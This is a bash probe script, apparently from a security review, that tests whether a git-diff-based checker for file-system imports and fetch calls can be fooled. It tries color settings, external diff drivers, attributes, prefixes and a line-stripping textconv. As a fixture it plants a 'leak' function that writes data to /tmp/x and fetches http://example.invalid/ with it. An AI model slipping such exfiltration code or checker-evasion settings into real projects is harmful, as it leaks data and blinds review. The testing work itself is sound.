#!/bin/bash
# security-nfr-QE-191-a probe. Scratch clone only; private HOME / GIT_CONFIG_GLOBAL / TMPDIR; system config off.
set -u
REPO=$1; TIP=$2; SC=$3
export HOME=$SC/home TMPDIR=$SC/tmp GIT_CONFIG_GLOBAL=$SC/home/.gitconfig GIT_CONFIG_NOSYSTEM=1
unset GIT_EXTERNAL_DIFF GIT_DIFF_OPTS
rm -rf "$SC/home" "$SC/tmp" "$SC/clone" "$SC/inst"; mkdir -p "$HOME" "$TMPDIR" "$SC/inst/node_modules"; : > "$GIT_CONFIG_GLOBAL"
IP=.grugops/context/design-F-072-1/probe/clause-b.mjs
ln -s "$REPO/node_modules/typescript" "$SC/inst/node_modules/typescript"
git -C "$REPO" show "$TIP:$IP" > "$SC/inst/cur.mjs"
# P: the fix shape — the one diff call gains --no-ext-diff --no-color --src-prefix=a/ --dst-prefix=b/
sed 's|git("diff", "-U0", "--no-renames", "--text", "--no-textconv", b, h,|git("diff", "-U0", "--no-renames", "--text", "--no-textconv", "--no-ext-diff", "--no-color", "--src-prefix=a/", "--dst-prefix=b/", b, h,|' "$SC/inst/cur.mjs" > "$SC/inst/fix.mjs"
cmp -s "$SC/inst/cur.mjs" "$SC/inst/fix.mjs" && { echo "fix sed did not apply"; exit 2; }
I=$SC/inst/cur.mjs; P=$SC/inst/fix.mjs
printf '#!/bin/sh\nexit 0\n' > "$SC/inst/silent.sh"; chmod +x "$SC/inst/silent.sh"
git clone -q --shared --no-checkout "$REPO" "$SC/clone"; cd "$SC/clone"
git -c advice.detachedHead=false checkout -q "$TIP"; git config user.email m@x; git config user.name probe
export GIT_AUTHOR_DATE=2026-10-21T00:00:00Z GIT_COMMITTER_DATE=2026-10-21T00:00:00Z
T=$(git rev-parse --short=8 HEAD)
H=src/book-file.ts
# X1: holder drops its node:fs import (QE's plant)
perl -0pi -e 's|import \{ readFileSync \} from "node:fs";\n\n||; s|return readFileSync\([^\n]*\);|return new Uint8Array(0);|' $H
git commit -qam X1; X1=$(git rev-parse --short=8 HEAD); git reset -q --hard $T
# ADD: a non-holder gains a node:fs import and a fetch call (a WIDENING: limb 1 and limb 3)
perl -0pi -e 's|\A|import { writeFileSync } from "node:fs";\nexport const leak = (s: string) => { writeFileSync("/tmp/x", s); return fetch("http://example.invalid/" + s); };\n|' src/fen.ts
git commit -qam ADD; ADD=$(git rev-parse --short=8 HEAD); git reset -q --hard $T
v() { node "$1" "$2" "$3" "$4" 2>&1 | grep -E '^  limb [123]: |^node:|Error' | head -1 | sed 's/^  //'; }
line() { printf '%-34s X1 L1 cur=%-20s fix=%-20s | ADD L1 cur=%-14s fix=%-14s L3 cur=%-14s fix=%s\n' "$1" \
  "$(v $I $T $X1 1)" "$(v $P $T $X1 1)" "$(v $I $T $ADD 1)" "$(v $P $T $ADD 1)" "$(v $I $T $ADD 3)" "$(v $P $T $ADD 3)"; }
echo "tip $T X1 $X1 ADD $ADD git $(git --version)"
line "R0 control (no config)"
git config color.diff always; line "R1 color.diff=always (repo)"; git config --unset color.diff
git config color.ui always; line "R2 color.ui=always (repo)"; git config --unset color.ui
git config diff.external "$SC/inst/silent.sh"; line "R3 diff.external=silent (repo)"; git config --unset diff.external
export GIT_EXTERNAL_DIFF=$SC/inst/silent.sh; line "R4 GIT_EXTERNAL_DIFF=silent (env)"; unset GIT_EXTERNAL_DIFF
git config diff.ext.command "$SC/inst/silent.sh"; printf 'src/** diff=ext\n' > .git/info/attributes
line "R5 info/attributes diff=ext+command"; rm .git/info/attributes
printf 'src/** diff=ext\n' > "$HOME/.gitattributes"; git config --global core.attributesFile "$HOME/.gitattributes"
line "R5g global attributesFile diff=ext"; rm "$HOME/.gitattributes"; git config --global --unset core.attributesFile
git config --unset diff.ext.command   # the committed-attribute routes (R5c-R5e) are in probe2.sh
git config diff.srcPrefix x/; git config diff.dstPrefix y/; line "R6 src/dstPrefix=x/,y/"; git config --unset diff.srcPrefix; git config --unset diff.dstPrefix
git config diff.noprefix true; line "R7 diff.noprefix"; git config --unset diff.noprefix
git config diff.mnemonicPrefix true; line "R8 diff.mnemonicPrefix"; git config --unset diff.mnemonicPrefix
export GIT_DIFF_OPTS=--unified=3; line "R9 GIT_DIFF_OPTS=--unified=3"; unset GIT_DIFF_OPTS
git config diff.algorithm histogram; line "R10 diff.algorithm=histogram"; git config --unset diff.algorithm
git config diff.relative true; line "R11 diff.relative=true"; git config --unset diff.relative
export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=color.diff GIT_CONFIG_VALUE_0=always; line "R12 GIT_CONFIG_COUNT color (env)"; unset GIT_CONFIG_COUNT GIT_CONFIG_KEY_0 GIT_CONFIG_VALUE_0
# R13: textconv reaching the AST input through `git show <rev>:<path>` (not the diff call)
git config diff.t.textconv "grep -v -e node: -e fetch"; printf 'src/** diff=t\n' > .git/info/attributes
line "R13 textconv strips imports (show)"
printf '   git show %s:src/fen.ts | head -2 =>\n' "$ADD"; git show $ADD:src/fen.ts | head -2 | sed 's/^/      /'
rm .git/info/attributes; git config --unset diff.t.textconv
# R14: does --no-color etc. matter for --name-only (the waiver pipe) under color.diff=always?
git config color.diff always; printf '%-34s name-only bytes: %s\n' "R14 waiver pipe under color" "$(git diff --name-only $T $ADD -- src | od -c | head -2 | tr -s ' ' | tr '\n' ' ')"; git config --unset color.diff
git config --list --local | grep -E '^(color|diff)\.' && echo "LEFTOVER CONFIG" || echo "clone config clean of color./diff. keys"
